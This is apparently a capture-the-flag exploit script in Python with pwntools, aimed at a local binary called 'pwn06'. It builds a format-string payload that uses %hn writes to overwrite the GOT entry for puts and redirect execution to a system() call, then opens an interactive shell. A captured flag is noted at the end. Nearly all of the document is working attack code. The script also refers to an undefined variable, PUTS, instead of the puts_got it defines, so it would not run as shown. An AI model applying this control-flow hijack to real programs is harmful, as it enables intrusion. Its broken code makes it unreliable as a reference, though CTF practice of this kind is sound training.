from pwn import *
p = process('./pwn06')
elf = ELF('./pwn06')

gdb.attach(p)

AZ = 0x6010A0					# p &AZaz09
puts_got = 0x601018				# x/3i 0x4006c0
systemTEXT = 0x400975			

'''
   0x0000000000400970 <+281>:	call   0x4006c0 <puts@plt>
   0x0000000000400975 <+286>:	lea    rdi,[rip+0x129]        # 0x400aa5
   0x000000000040097c <+293>:	call   0x400700 <system@plt>
   0x0000000000400981 <+298>:	jmp    0x4009af <main+344>
'''

# 0x0975 = 2421
# 0x10040 - 0x0975 - 4 = 63175
# 0x20000 - 0x10040 - 3 = 65469

# parameter 10

payload = "%" + str(0x0975) + "c%16$hn----"		# 10 11
payload += "%" + str(0x10040-0x0975-4) + "c%17$hn---"	# 12 13
payload += "%" + str(0x20000-0x10040-3) + "c%18$hn---"	# 14 15
payload += p64(PUTS)	# 16
payload += p64(PUTS+2)	# 17
payload += p64(PUTS+4)	# 18

p.recvuntil("Enter password ...")
p.sendline(payload)

p.interactive()

# WhiteHat{G1v3_m3_a_cl4b}